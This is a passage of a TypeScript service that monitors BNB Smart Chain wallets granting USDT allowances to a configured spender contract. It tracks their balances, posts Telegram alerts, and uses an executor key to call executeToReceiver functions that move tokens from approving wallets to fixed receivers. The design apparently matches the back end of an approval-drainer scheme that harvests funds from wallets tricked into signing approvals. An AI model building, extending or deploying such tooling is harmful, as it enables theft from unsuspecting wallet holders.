import crypto from "node:crypto";
import { ethers } from "ethers";
import { reconstructWalletBalanceTimeline } from "./balance-history";
import { config } from "./config";
import {
  Store,
  type ApprovalRecord,
  type IncomingTransferRecord,
  type TransferRecord,
  type WalletRecord
} from "./store";

const ABI = [
  "function executeToReceiver1(address wallet,uint256 amount)",
  "function executeToReceiver2(address wallet,uint256 amount)",
  "function isExecutor(address) view returns (bool)",
  "function usdt() view returns (address)",
  "event TransferExecuted(address indexed executor,address indexed wallet,address indexed receiver,uint256 amount)"
];
const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function allowance(address,address) view returns (uint256)",
  "function symbol() view returns (string)",
  "function decimals() view returns (uint8)"
];
const MAX_RATE_LIMIT_RETRIES = 5;
const INITIAL_RATE_LIMIT_DELAY_MS = 500;
const RPC_REQUEST_TIMEOUT_MS = 10_000;
const BALANCE_REFRESH_CONCURRENCY = 5;
const EXPECTED_USDT_DECIMALS = 18;
const MAX_UINT256 = (1n << 256n) - 1n;
const TELEGRAM_RETRY_INTERVAL_MS = 60_000;
const TELEGRAM_MAX_RETRY_DELAY_MS = 60 * 60_000;
const TELEGRAM_REQUEST_TIMEOUT_MS = 10_000;
const TELEGRAM_DELIVERY_LEASE_MS = 2 * 60_000;
const NO_PRIOR_GRANT_ERROR = "No earlier verified positive approval exists for this wallet and spender";
const APPROVAL_CONFIRMATION_THRESHOLD = 15;
const REORG_LOOKBACK_BLOCKS = APPROVAL_CONFIRMATION_THRESHOLD * 2;

export function incomingTransferConfirmationState(
  record: IncomingTransferRecord,
  latestBlock: number,
  canonicalBlockHash: string | undefined
) {
  if (
    record.canonicalStatus !== "canonical" ||
    !canonicalBlockHash ||
    record.blockHash.toLowerCase() !== canonicalBlockHash.toLowerCase() ||
    !Number.isInteger(latestBlock)
  ) return undefined;
  const confirmations = Math.max(0, latestBlock - record.blockNumber + 1);
  return {
    confirmations,
    confirmationStatus: confirmations >= APPROVAL_CONFIRMATION_THRESHOLD ? "confirmed" as const : "pending" as const,
    eligible: confirmations >= APPROVAL_CONFIRMATION_THRESHOLD
  };
}

type HistoricalBalanceSnapshot = {
  before?: string;
  after?: string;
  rawBefore?: string;
  rawAfter?: string;
  status: string;
};

function sanitizeTelegramError(error: unknown, botToken: string): string {
  const message = error instanceof Error ? error.message : String(error);
  return botToken ? message.split(botToken).join("[redacted]") : message;
}

function sanitizeRpcError(error: unknown): string {
  let message = error instanceof Error ? error.message : String(error);
  message = message.replace(/https?:\/\/[^\s"'<>]+/g, "[RPC endpoint]");
  for (const secret of [config.TELEGRAM_BOT_TOKEN, config.SUPABASE_SERVICE_ROLE_KEY]) {
    if (secret) message = message.split(secret).join("[redacted]");
  }
  return message;
}

function normalizeTokenDecimals(value: unknown): number {
  const decimals = typeof value === "number"
    ? value
    : typeof value === "string" && /^\d+$/.test(value)
      ? Number(value)
      : Number.NaN;
  if (!Number.isInteger(decimals) || decimals < 0 || decimals > 36) {
    throw new Error("USDT returned invalid token decimals");
  }
  return decimals;
}

function escapeHtml(value: string): string {
  const replacements: Record<string, string> = {
    "&": "&amp;",
    "<": "&lt;",
    ">": "&gt;",
    "\"": "&quot;",
    "'": "&#39;"
  };
  return value.replace(/[&<>"']/g, (character) => replacements[character]);
}

function formatAmount(value: string): string {
  const [whole, fraction = ""] = value.split(".");
  const groupedWhole = whole.replace(/\B(?=(\d{3})+(?!\d))/g, ",");
  const trimmedFraction = fraction.replace(/0+$/, "");
  return trimmedFraction ? `${groupedWhole}.${trimmedFraction}` : groupedWhole;
}

function formatRawAmount(value: string, decimals: number): string {
  if (!/^\d+$/.test(value)) throw new Error("Invalid raw token amount");
  const rawAmount = BigInt(value);
  if (rawAmount < 0n || rawAmount > MAX_UINT256) throw new Error("Raw token amount is outside uint256 range");
  return formatAmount(ethers.formatUnits(rawAmount, decimals));
}

function formatStatus(value: string): string {
  const maximumLength = 700;
  const safeValue = value.length > maximumLength
    ? `${value.slice(0, maximumLength - 1)}…`
    : value;
  return escapeHtml(safeValue);
}

function formatTimestamp(value: string): string {
  const date = new Date(value);
  return Number.isNaN(date.getTime()) ? "Unavailable" : date.toISOString().replace("T", " ").replace(/\.\d{3}Z$/, " UTC");
}

function createRpcProvider(url: string): ethers.JsonRpcProvider {
  const request = new ethers.FetchRequest(url);
  request.timeout = RPC_REQUEST_TIMEOUT_MS;
  return new ethers.JsonRpcProvider(
    request,
    { name: "bnb", chainId: config.CHAIN_ID },
    { batchMaxCount: 1 }
  );
}

class FailoverJsonRpcProvider extends ethers.JsonRpcProvider {
  private primaryFailed = false;

  constructor(primaryUrl: string, private readonly fallbackProvider: ethers.JsonRpcProvider) {
    const request = new ethers.FetchRequest(primaryUrl);
    request.timeout = RPC_REQUEST_TIMEOUT_MS;
    super(request, { name: "bnb", chainId: config.CHAIN_ID }, { batchMaxCount: 1 });
  }

  override async send(method: string, params: Array<any> | Record<string, any>): Promise<any> {
    if (this.primaryFailed) return this.fallbackProvider.send(method, params);

    try {
      return await super.send(method, params);
    } catch (error) {
      this.primaryFailed = true;
      console.warn(`Primary BSC RPC failed for ${method}: ${sanitizeRpcError(error)}; switching to fallback RPC`);
      return this.fallbackProvider.send(method, params);
    }
  }

  override async _send(payload: Parameters<ethers.JsonRpcProvider["_send"]>[0]) {
    if (this.primaryFailed) return this.fallbackProvider._send(payload);

    try {
      const response = await super._send(payload);
      if (response.some((item) => "error" in item && isRateLimitError(item.error))) {
        this.primaryFailed = true;
        console.warn("Primary BSC RPC returned a usage-limit error; switching to fallback RPC");
        return this.fallbackProvider._send(payload);
      }
      return response;
    } catch (error) {
      this.primaryFailed = true;
      console.warn(`Primary BSC RPC connection failed: ${sanitizeRpcError(error)}; switching to fallback RPC`);
      return this.fallbackProvider._send(payload);
    }
  }
}

function isRateLimitError(error: unknown): boolean {
  const pending: unknown[] = [error];
  const seen = new Set<object>();
  const rateLimitMessage = /rate.?limit|usage.?limit|too many requests|\b429\b/i;
  const rangeLimitMessage = /limit exceeded|query returned more than|block range/i;
  let hasRateLimitCode = false;
  let hasRangeLimitMessage = false;

  while (pending.length > 0) {
    const current = pending.pop();
    if (typeof current === "string") {
      if (rateLimitMessage.test(current)) return true;
      if (rangeLimitMessage.test(current)) hasRangeLimitMessage = true;
      continue;
    }
    if (typeof current !== "object" || current === null || seen.has(current)) continue;
    seen.add(current);

    const details = current as Record<string, unknown>;
    if (
      details.code === -32001 || details.code === "-32001" ||
      details.code === -32005 || details.code === "-32005"
    ) hasRateLimitCode = true;
    for (const key of ["message", "shortMessage", "reason", "error", "info", "cause", "response"]) {
      const detail = details[key];
      if (typeof detail === "string" || (typeof detail === "object" && detail !== null)) {
        pending.push(detail);
      }
    }
  }

  return hasRateLimitCode && !hasRangeLimitMessage;
}

function isLogRangeLimitError(error: unknown): boolean {
  const pending: unknown[] = [error];
  const seen = new Set<object>();
  const rangeLimitMessage = /limit exceeded|query returned more than|block range/i;

  while (pending.length > 0) {
    const current = pending.pop();
    if (typeof current === "string") {
      if (rangeLimitMessage.test(current)) return true;
      continue;
    }
    if (typeof current !== "object" || current === null || seen.has(current)) continue;
    seen.add(current);

    const details = current as Record<string, unknown>;
    for (const key of ["message", "shortMessage", "reason", "error", "info", "cause", "response"]) {
      const detail = details[key];
      if (typeof detail === "string" || (typeof detail === "object" && detail !== null)) {
        pending.push(detail);
      }
    }
  }

  return false;
}

export class ManualTransferError extends Error {
  constructor(message: string, readonly statusCode: number) {
    super(message);
    this.name = "ManualTransferError";
  }
}

export class WalletMonitor {
  private readonly primaryProvider = createRpcProvider(config.BNB_MAINNET_RPC_URL);
  private readonly fallbackProvider = createRpcProvider(config.BNB_MAINNET_RPC_FALLBACK_URL);
  private readonly provider = new FailoverJsonRpcProvider(config.BNB_MAINNET_RPC_URL, this.fallbackProvider);
  private readonly signer = config.EXECUTOR_PRIVATE_KEY ? new ethers.Wallet(config.EXECUTOR_PRIVATE_KEY, this.provider) : null;
  private readonly contract = this.signer ? new ethers.Contract(config.ALLOWANCE_SPENDER_ADDRESS, ABI, this.signer) : null;
  private readonly token = new ethers.Contract(config.USDT_ADDRESS, ERC20_ABI, this.provider);
  private readonly eventInterface = new ethers.Interface([
    "event Approval(address indexed owner,address indexed spender,uint256 value)",
    "event Transfer(address indexed from,address indexed to,uint256 value)",
    "event TransferExecuted(address indexed executor,address indexed wallet,address indexed receiver,uint256 amount)"
  ]);
  private tokenDecimals = 6;
  private tokenSymbol = "USDT";
  private readonly blockTimestampCache = new Map<number, string>();
  private readonly receiptCache = new Map<string, Promise<ethers.TransactionReceipt | null>>();
  private running = false;
  private eventQueue: Promise<void> = Promise.resolve();
  private pendingBlockNumber?: number;
  private blockProcessingScheduled = false;
  private latestObservedBlock = 0;
  private balanceRefreshInProgress = false;
  private balanceRefreshRequested = false;
  private telegramRetryTimer?: ReturnType<typeof setInterval>;
  private telegramRetryInProgress = false;
  private readonly telegramNotificationsInFlight = new Set<string>();
  private readonly successfulTelegramNotifications = new Map<string, string>();
  private readonly incomingBalanceTimelineCache = new Map<string, Promise<Map<string, HistoricalBalanceSnapshot>>>();
  private readonly pendingTransferBalanceUpdates = new Map<string, Set<string>>();
  private readonly blockListener = (blockNumber: number) => {
    void this.enqueueBlock(blockNumber).catch((error) => {
      console.error("Block event processing failed:", error);
    });
  };

  constructor(private readonly store: Store) {}

  async start() {
    if (this.running) return;
    const network = await this.provider.getNetwork();
    if (network.chainId !== BigInt(config.CHAIN_ID)) {
      throw new Error(`RPC chain ID ${network.chainId} does not match configured chain ID ${config.CHAIN_ID}`);
    }
    this.tokenDecimals = normalizeTokenDecimals(Number(await this.token.decimals()));
    if (this.tokenDecimals !== EXPECTED_USDT_DECIMALS) {
      throw new Error(
        `Configured USDT contract returned ${this.tokenDecimals} decimals; expected ${EXPECTED_USDT_DECIMALS} on BNB Smart Chain`
      );
    }
    this.tokenSymbol = "USDT";
    this.store.setLifetimeTransferredDecimals(this.tokenDecimals);
    if (this.contract) {
      await this.assertExecutor();
    }
    this.running = true;
    try {
      await this.recoverApprovalLinkedWallets();
      await this.retryPendingTelegramNotifications();
      this.telegramRetryTimer = setInterval(() => {
        void this.retryPendingTelegramNotifications().catch((error) => {
          console.error("[Telegram] Notification retry scan failed:", error);
        });
      }, TELEGRAM_RETRY_INTERVAL_MS);
      this.telegramRetryTimer.unref();
      this.provider.on("block", this.blockListener);
      this.scheduleApprovalLinkedWalletBalanceRefresh();
      await this.enqueueBlock(await this.provider.getBlockNumber());
    } catch (error) {
      this.running = false;
      await this.provider.off("block", this.blockListener);
      throw error;
    }
  }

  stop() {
    this.running = false;
    if (this.telegramRetryTimer) clearInterval(this.telegramRetryTimer);
    this.telegramRetryTimer = undefined;
    void this.provider.off("block", this.blockListener);
  }

  private async retryPendingTelegramNotifications() {
    if (!config.TELEGRAM_BOT_TOKEN || !config.TELEGRAM_CHAT_ID) return;
    if (this.telegramRetryInProgress) return;
    this.telegramRetryInProgress = true;
    try {
      const retryable = await this.store.listRetryableTelegramNotifications();
      const records: Array<
        | { type: "Approval"; record: ApprovalRecord }
        | { type: "Transfer"; record: TransferRecord }
        | { type: "IncomingTransfer"; record: IncomingTransferRecord }
      > = [
        ...retryable.approvals
          .filter((record) =>
            !(record.rawApprovalAmount === "0" &&
              !this.isRevocationEligible(record) &&
              record.telegramStatus === "skipped" &&
              record.telegramError === NO_PRIOR_GRANT_ERROR)
          )
          .map((record) => ({ type: "Approval" as const, record })),
        ...retryable.transfers
          .map((record) => ({ type: "Transfer" as const, record })),
        ...retryable.incomingTransfers
          .map((record) => ({ type: "IncomingTransfer" as const, record }))
      ];

      for (const { type, record } of records) {
        const retryDelay = Math.min(
          TELEGRAM_RETRY_INTERVAL_MS * 2 ** Math.max(0, record.telegramAttemptCount - 1),
          TELEGRAM_MAX_RETRY_DELAY_MS
        );
        const lastAttemptAt = Date.parse(record.updatedAt);
        if (
          record.telegramAttemptCount > 0 &&
          Number.isFinite(lastAttemptAt) &&
          Date.now() - lastAttemptAt < retryDelay
        ) continue;

        try {
          if (type === "IncomingTransfer") {
            await this.sendIncomingTransferNotification(record);
          } else {
            const notificationRecord = type === "Approval"
              ? await this.prepareApprovalNotification(record)
              : record;
            await this.sendTelegramNotification(type, notificationRecord);
          }
        } catch (error) {
          console.error(`[Telegram] Could not update ${type.toLowerCase()} notification ${record.id}:`, error);
        }
      }
    } catch (error) {
      console.error("[Telegram] Could not query pending notifications:", error);
    } finally {
      this.telegramRetryInProgress = false;
    }
  }

  private enqueueBlock(blockNumber: number): Promise<void> {
    this.latestObservedBlock = Math.max(this.latestObservedBlock, blockNumber);
    this.pendingBlockNumber = Math.max(this.pendingBlockNumber ?? blockNumber, blockNumber);
    if (this.blockProcessingScheduled) return this.eventQueue;

    this.blockProcessingScheduled = true;
    const processing = this.eventQueue.then(async () => {
      try {
        while (this.running && this.pendingBlockNumber !== undefined) {
          const latestBlock = this.pendingBlockNumber;
          this.pendingBlockNumber = undefined;
          await this.scanBlockchainEvents(latestBlock);
        }
      } finally {
        this.blockProcessingScheduled = false;
      }
    });
    this.eventQueue = processing.catch(() => undefined);
    return processing;
  }

  private async assertExecutor() {
    if (!this.contract || !this.signer) throw new Error("Executor private key is not configured");
    const tokenAddress = await this.contract.usdt() as string;
    if (tokenAddress.toLowerCase() !== config.USDT_ADDRESS.toLowerCase()) {
      throw new Error(`Configured token ${config.USDT_ADDRESS} does not match spender contract token ${tokenAddress}`);
    }
    if (!(await this.contract.isExecutor(this.signer.address))) throw new Error(`Executor ${this.signer.address} is not authorized`);
  }

  private async recoverApprovalLinkedWallets() {
    const approvals = this.store.listApprovalEvents()
      .filter((approval) =>
        approval.tokenContract.toLowerCase() === config.USDT_ADDRESS.toLowerCase() &&
        approval.spender.toLowerCase() === config.ALLOWANCE_SPENDER_ADDRESS.toLowerCase() &&
        approval.chainId === String(config.CHAIN_ID) &&
        approval.canonicalStatus !== "reorged"
      )
      .sort((first, second) =>
        first.blockNumber - second.blockNumber || first.logIndex - second.logIndex
      );
    const latestApprovalByWallet = new Map<string, ApprovalRecord>();
    for (const approval of approvals) {
      latestApprovalByWallet.set((approval.walletAddress || approval.ownerAddress).toLowerCase(), approval);
    }
    for (const approval of latestApprovalByWallet.values()) {
      const wallet = approval.walletAddress || approval.ownerAddress;
      if (!wallet) continue;
      const existing = this.store.getWallet(wallet);
      if (approval.rawApprovalAmount === "0") {
        if (existing) {
          await this.store.update(wallet, {
            approvalLinked: false,
            currentAllowance: "0",
            spender: config.ALLOWANCE_SPENDER_ADDRESS,
            tokenContract: config.USDT_ADDRESS,
            chainId: String(config.CHAIN_ID),
            updatedAt: new Date().toISOString()
          });
        }
        continue;
      }
      const nextWallet: WalletRecord = {
        ...existing,
        address: wallet,
        receiver: existing?.receiver ?? 1,
        active: existing?.active ?? true,
        createdAt: existing?.createdAt ?? new Date().toISOString(),
        approvalLinked: true,
        tokenContract: config.USDT_ADDRESS,
        tokenSymbol: approval.tokenSymbol || existing?.tokenSymbol || "USDT",
        tokenDecimals: this.tokenDecimals,
        network: config.NETWORK_NAME,
        chainId: String(config.CHAIN_ID),
        currentAllowance: approval.tokenDecimals === this.tokenDecimals
          ? approval.currentAllowance ?? existing?.currentAllowance
          : undefined,
        rawCurrentAllowance: approval.tokenDecimals === this.tokenDecimals
          ? approval.rawCurrentAllowance ?? existing?.rawCurrentAllowance
          : undefined,
        currentBalance: approval.tokenDecimals === this.tokenDecimals
          ? approval.walletBalance ?? existing?.currentBalance
          : undefined,
        rawCurrentBalance: approval.tokenDecimals === this.tokenDecimals
          ? approval.rawWalletBalance ?? existing?.rawCurrentBalance
          : undefined,
        spender: approval.spender,
        firstDetectedAt: approval.createdAt,
        latestApprovalTxHash: approval.transactionHash,
        latestActivityAt: approval.blockTimestamp,
        updatedAt: new Date().toISOString()
      };
      await this.store.register(nextWallet);
    }
  }

  private async readApprovalValue(
    label: string,
    owner: string,
    blockNumber: number,
    read: (provider: ethers.JsonRpcProvider, blockTag?: number) => Promise<bigint>
  ): Promise<{ value?: string; rawValue?: string; status: string }> {
    const historicalErrors: string[] = [];
    for (const [source, provider] of [
      ["primary RPC", this.primaryProvider],
      ["fallback RPC", this.fallbackProvider]
    ] as const) {
      try {
        const historicalValue = await read(provider, blockNumber);
        return {
          value: ethers.formatUnits(historicalValue, this.tokenDecimals),
          rawValue: historicalValue.toString(),
          status: `Verified at block ${blockNumber} (${source})`
        };
      } catch (error) {
        const detail = sanitizeRpcError(error);
        historicalErrors.push(`${source}: ${detail}`);
        console.error(
          `[Monitor] Historical ${label} query failed for ${owner} at block ${blockNumber} (${source}): ${detail}`
        );
      }
    }

    const historicalFailure = historicalErrors.join("; ");
    const latestErrors: string[] = [];
    for (const [source, provider] of [
      ["primary RPC", this.primaryProvider],
      ["fallback RPC", this.fallbackProvider]
    ] as const) {
      try {
        const latestValue = await read(provider);
        return {
          value: ethers.formatUnits(latestValue, this.tokenDecimals),
          rawValue: latestValue.toString(),
          status: `Latest queried via ${source}; historical query failed: ${historicalFailure}` +
            (latestErrors.length > 0 ? `; earlier latest query failed: ${latestErrors.join("; ")}` : "")
        };
      } catch (error) {
        const detail = sanitizeRpcError(error);
        latestErrors.push(`${source}: ${detail}`);
        console.error(`[Monitor] Latest ${label} query failed for ${owner} (${source}): ${detail}`);
      }
    }

    return {
      status: `Unavailable; historical query failed: ${historicalFailure}; latest query failed: ${latestErrors.join("; ")}`
    };
  }

  private async getApprovalState(owner: string, blockNumber: number) {
    const [allowance, balance] = await Promise.all([
      this.readApprovalValue(
        "configured-spender allowance",
        owner,
        blockNumber,
        (provider, blockTag) => new ethers.Contract(config.USDT_ADDRESS, ERC20_ABI, provider).allowance(
          owner,
          config.ALLOWANCE_SPENDER_ADDRESS,
          blockTag === undefined ? {} : { blockTag }
        ) as Promise<bigint>
      ),
      this.readApprovalValue(
        "USDT wallet balance",
        owner,
        blockNumber,
        (provider, blockTag) => new ethers.Contract(config.USDT_ADDRESS, ERC20_ABI, provider).balanceOf(
          owner,
          blockTag === undefined ? {} : { blockTag }
        ) as Promise<bigint>
      )
    ]);
    return {
      currentAllowance: allowance.value,
      rawCurrentAllowance: allowance.rawValue,
      allowanceStatus: allowance.status,
      walletBalance: balance.value,
      rawWalletBalance: balance.rawValue,
      balanceStatus: balance.status
    };
  }

  private async getPreviousAllowance(owner: string, blockNumber: number) {
    if (blockNumber <= 0) {
      return { previousAllowance: undefined, previousAllowanceStatus: "Unknown (historical state unavailable)" };
    }
    const errors: string[] = [];
    for (const [source, provider] of [
      ["primary RPC", this.primaryProvider],
      ["fallback RPC", this.fallbackProvider]
    ] as const) {
      try {
        const value = await new ethers.Contract(config.USDT_ADDRESS, ERC20_ABI, provider).allowance(
          owner,
          config.ALLOWANCE_SPENDER_ADDRESS,
          { blockTag: blockNumber - 1 }
        ) as bigint;
        return {
          previousAllowance: ethers.formatUnits(value, this.tokenDecimals),
          rawPreviousAllowance: value.toString(),
          previousAllowanceStatus: `Verified at block ${blockNumber - 1} (${source})`
        };
      } catch (error) {
        const detail = sanitizeRpcError(error);
        errors.push(`${source}: ${detail}`);
        console.error(
          `[Monitor] Previous configured-spender allowance query failed at block ${blockNumber - 1} (${source}): ${detail}`
        );
      }
    }
    return {
      previousAllowance: undefined,
      rawPreviousAllowance: undefined,
      previousAllowanceStatus: `Unknown; historical query failed: ${errors.join("; ")}`
    };
  }

  private async prepareApprovalNotification(record: ApprovalRecord): Promise<ApprovalRecord> {
    if (!/^\d+$/.test(record.rawApprovalAmount)) {
      throw new Error(`Approval event ${record.id} has an invalid raw amount`);
    }
    if (BigInt(record.rawApprovalAmount) > MAX_UINT256) {
      throw new Error(`Approval event ${record.id} exceeds the uint256 range`);
    }

    const decimalsChanged = record.tokenDecimals !== this.tokenDecimals;
    const normalized: ApprovalRecord = {
      ...record,
      tokenSymbol: "USDT",
      tokenDecimals: this.tokenDecimals,
      approvalAmount: ethers.formatUnits(BigInt(record.rawApprovalAmount), this.tokenDecimals)
    };
    let updated = decimalsChanged || normalized.approvalAmount !== record.approvalAmount
      ? normalized
      : record;

    if (record.rawApprovalAmount === "0") {
      if (decimalsChanged || !record.previousAllowanceStatus || record.rawPreviousAllowance === undefined) {
        updated = {
          ...updated,
          ...(await this.getPreviousAllowance(record.ownerAddress, record.blockNumber))
        };
      }
      if (!record.allowanceStatus) {
        updated = { ...updated, allowanceStatus: "Verified by zero-value Approval event" };
      }
    } else if (
      decimalsChanged ||
      !record.allowanceStatus ||
      !record.balanceStatus ||
      record.rawCurrentAllowance === undefined ||
      record.rawWalletBalance === undefined
    ) {
      updated = { ...updated, ...(await this.getApprovalState(record.ownerAddress, record.blockNumber)) };
    }

    if (record.blockTimestampStatus !== "verified") {
      const timestamp = await this.getBlockTimestamp(record.blockNumber);
      updated = {
        ...updated,
        blockTimestamp: timestamp.timestamp,
        blockTimestampStatus: timestamp.status
      };
    }

    if (updated !== record) {
      updated = { ...updated, updatedAt: new Date().toISOString() };
      try {
        await this.store.upsertApproval(updated);
      } catch {
        console.error(`[Telegram] Could not persist enriched approval notification data for ${record.id}.`);
      }
    }
    return updated;
  }

  private async refreshWalletState(walletAddress: string, decimals: number) {
    const [balanceResult, allowanceResult] = await Promise.allSettled([
      this.token.balanceOf(walletAddress),
      this.token.allowance(walletAddress, config.ALLOWANCE_SPENDER_ADDRESS)
    ]);
    const update: Partial<WalletRecord> = {};
    if (balanceResult.status === "fulfilled") {
      update.currentBalance = ethers.formatUnits(balanceResult.value, decimals);
      update.rawCurrentBalance = balanceResult.value.toString();
      update.currentBalanceStatus = "Latest queried";
    } else {
      const detail = sanitizeRpcError(balanceResult.reason);
      update.currentBalance = undefined;
      update.rawCurrentBalance = undefined;
      update.currentBalanceStatus = `Unavailable: ${detail}`;
      console.error(`[Monitor] Latest USDT balance refresh failed for ${walletAddress}: ${detail}`);
    }
    if (allowanceResult.status === "fulfilled") {
      update.currentAllowance = ethers.formatUnits(allowanceResult.value, decimals);
      update.rawCurrentAllowance = allowanceResult.value.toString();
      update.currentAllowanceStatus = "Latest queried";
      update.approvalLinked = allowanceResult.value > 0n;
    } else {
      const detail = sanitizeRpcError(allowanceResult.reason);
      update.currentAllowance = undefined;
      update.rawCurrentAllowance = undefined;
      update.currentAllowanceStatus = `Unavailable: ${detail}`;
      console.error(`[Monitor] Latest configured-spender allowance refresh failed for ${walletAddress}: ${detail}`);
    }
    if (Object.keys(update).length > 0) await this.store.update(walletAddress, update);
    return update.currentBalance;
  }

  private async refreshApprovalLinkedWalletBalances() {
    const wallets = this.store.listApprovalLinkedWallets();
    let nextWallet = 0;
    const worker = async () => {
      while (nextWallet < wallets.length) {
        const wallet = wallets[nextWallet++];
        const currentBalance = await this.refreshWalletState(
          wallet.address,
          this.tokenDecimals
        );
        if (currentBalance === undefined) continue;

        const walletAddress = wallet.address.toLowerCase();
        const pendingTransferIds = this.pendingTransferBalanceUpdates.get(walletAddress);
        if (!pendingTransferIds) continue;
        for (const transferId of [...pendingTransferIds]) {
          const transfer = this.store.getTransferEvent(transferId);
          if (transfer) {
            await this.store.upsertTransfer({
              ...transfer,
              currentBalance,
              updatedAt: new Date().toISOString()
            });
          }
          pendingTransferIds.delete(transferId);
        }
        if (pendingTransferIds.size === 0) {
          this.pendingTransferBalanceUpdates.delete(walletAddress);
        }
      }
    };
    await Promise.all(
      Array.from(
        { length: Math.min(BALANCE_REFRESH_CONCURRENCY, wallets.length) },
        () => worker()
      )
    );
  }

  private scheduleApprovalLinkedWalletBalanceRefresh() {
    if (!this.running) return;
    if (this.balanceRefreshInProgress) {
      this.balanceRefreshRequested = true;
      return;
    }

    this.balanceRefreshInProgress = true;
    void this.refreshApprovalLinkedWalletBalances()
      .catch((error) => {
        console.error("Approval-linked wallet balance refresh failed:", error);
      })
      .finally(() => {
        this.balanceRefreshInProgress = false;
        if (this.balanceRefreshRequested && this.running) {
          this.balanceRefreshRequested = false;
          this.scheduleApprovalLinkedWalletBalanceRefresh();
        }
      });
  }

  private async getBlockTimestamp(blockNumber: number) {
    const cached = this.blockTimestampCache.get(blockNumber);
    if (cached) return { timestamp: cached, status: "verified" as const };

    try {
      const block = await this.provider.getBlock(blockNumber);
      if (!block) {
        console.error(`[Monitor] No block data returned for timestamp query at block ${blockNumber}.`);
        return { timestamp: "", status: "unavailable" as const };
      }
      const timestamp = new Date(Number(block.timestamp) * 1000).toISOString();
      if (this.blockTimestampCache.size >= 500) {
        const oldestBlock = this.blockTimestampCache.keys().next().value;
        if (oldestBlock !== undefined) this.blockTimestampCache.delete(oldestBlock);
      }
      this.blockTimestampCache.set(blockNumber, timestamp);
      return { timestamp, status: "verified" as const };
    } catch (error) {
      const detail = sanitizeRpcError(error);
      console.error(`[Monitor] Block timestamp query failed for block ${blockNumber}: ${detail}`);
      return { timestamp: "", status: "unavailable" as const };
    }
  }

  private async getReceipt(log: ethers.Log): Promise<ethers.TransactionReceipt> {
    const transactionHash = log.transactionHash.toLowerCase();
    let receiptRequest = this.receiptCache.get(transactionHash);
    if (!receiptRequest) {
      receiptRequest = this.provider.getTransactionReceipt(log.transactionHash);
      this.receiptCache.set(transactionHash, receiptRequest);
      if (this.receiptCache.size > 1000) {
        const oldestTransaction = this.receiptCache.keys().next().value;
        if (oldestTransaction !== undefined) this.receiptCache.delete(oldestTransaction);
      }
    }

    let receipt: ethers.TransactionReceipt | null;
    try {
      receipt = await receiptRequest;
    } catch (error) {
      this.receiptCache.delete(transactionHash);
      const detail = sanitizeRpcError(error);
      throw new Error(`Transaction receipt retrieval failed for ${log.transactionHash}: ${detail}`);
    }
    if (!receipt) {
      this.receiptCache.delete(transactionHash);
      throw new Error(`No transaction receipt returned for ${log.transactionHash}`);
    }
    return receipt;
  }

  private receiptContainsLog(receipt: ethers.TransactionReceipt, log: ethers.Log) {
    return receipt.logs.some((receiptLog) =>
      receiptLog.index === log.index &&
      receiptLog.address.toLowerCase() === log.address.toLowerCase() &&
      receiptLog.transactionHash.toLowerCase() === log.transactionHash.toLowerCase() &&
      receiptLog.topics.length === log.topics.length &&
      receiptLog.topics.every((topic, index) => topic.toLowerCase() === log.topics[index].toLowerCase()) &&
      receiptLog.data.toLowerCase() === log.data.toLowerCase()
    );
  }

  private async verifySuccessfulEventReceipt(log: ethers.Log) {
    const receipt = await this.getReceipt(log);
    if (
      receipt.status !== 1 ||
      receipt.blockNumber !== log.blockNumber ||
      receipt.hash.toLowerCase() !== log.transactionHash.toLowerCase() ||
      !this.receiptContainsLog(receipt, log)
    ) {
      console.warn(`[Monitor] Ignoring event ${log.transactionHash}:${log.index}; successful receipt evidence did not match.`);
      return false;
    }
    return true;
  }

  private async getLogsWithRangeFallback(
    filter: Omit<ethers.Filter, "fromBlock" | "toBlock">,
    fromBlock: number,
    toBlock: number,
    provider: ethers.JsonRpcProvider = this.provider
  ): Promise<ethers.Log[]> {
    for (let rateLimitAttempt = 0; ; rateLimitAttempt += 1) {
      try {
        return await provider.getLogs({ ...filter, fromBlock, toBlock });
      } catch (error) {
        if (isRateLimitError(error)) {
          if (rateLimitAttempt >= MAX_RATE_LIMIT_RETRIES) {
            if (provider !== this.provider) throw error;
            console.warn(`RPC rate limit for blocks ${fromBlock}-${toBlock}; switching to fallback RPC`);
            return this.getLogsWithRangeFallback(filter, fromBlock, toBlock, this.fallbackProvider);
          }
          const delayMs = INITIAL_RATE_LIMIT_DELAY_MS * 2 ** rateLimitAttempt;
          console.warn(`RPC rate limit for blocks ${fromBlock}-${toBlock}; retrying in ${delayMs}ms`);
          await new Promise((resolve) => setTimeout(resolve, delayMs));
          continue;
        }
        if (isLogRangeLimitError(error)) {
          if (fromBlock >= toBlock) {
            if (provider !== this.provider) throw error;
            console.warn(`Primary RPC rejected log query for block ${fromBlock}; switching to fallback RPC`);
            return this.getLogsWithRangeFallback(filter, fromBlock, toBlock, this.fallbackProvider);
          }
          const middleBlock = Math.floor((fromBlock + toBlock) / 2);
          console.warn(`RPC log query exceeded limits for blocks ${fromBlock}-${toBlock}; retrying in smaller ranges`);
          const firstHalf = await this.getLogsWithRangeFallback(filter, fromBlock, middleBlock, provider);
          const secondHalf = await this.getLogsWithRangeFallback(filter, middleBlock + 1, toBlock, provider);
          return [...firstHalf, ...secondHalf];
        }
        if (provider === this.provider) {
          console.warn(`Primary RPC log query failed for blocks ${fromBlock}-${toBlock}; switching to fallback RPC`);
          return this.getLogsWithRangeFallback(filter, fromBlock, toBlock, this.fallbackProvider);
        }
        if (fromBlock >= toBlock) throw error;
        const middleBlock = Math.floor((fromBlock + toBlock) / 2);
        console.warn(`RPC log query failed for blocks ${fromBlock}-${toBlock}; retrying in smaller ranges`);
        const firstHalf = await this.getLogsWithRangeFallback(filter, fromBlock, middleBlock, provider);
        const secondHalf = await this.getLogsWithRangeFallback(filter, middleBlock + 1, toBlock, provider);
        return [...firstHalf, ...secondHalf];
      }
    }
  }

  private async reconcileRecentReorgs(fromBlock: number, toBlock: number) {
    const records = [
      ...this.store.listApprovalEvents()
        .filter((record) => record.blockNumber >= fromBlock && record.blockNumber <= toBlock && record.blockHash),
      ...this.store.listIncomingTransferEvents()
        .filter((record) => record.blockNumber >= fromBlock && record.blockNumber <= toBlock)
    ];
    const canonicalHashes = new Map<number, string>();
    let changed = false;
    for (const record of records) {
      let canonicalHash = canonicalHashes.get(record.blockNumber);
      if (!canonicalHash) {
        const block = await this.provider.getBlock(record.blockNumber);
        if (!block?.hash) continue;
        canonicalHash = block.hash.toLowerCase();
        canonicalHashes.set(record.blockNumber, canonicalHash);
      }
      if (record.blockHash?.toLowerCase() === canonicalHash) {
        if (record.canonicalStatus === "reorged") {
          if ("approvalAmount" in record) {
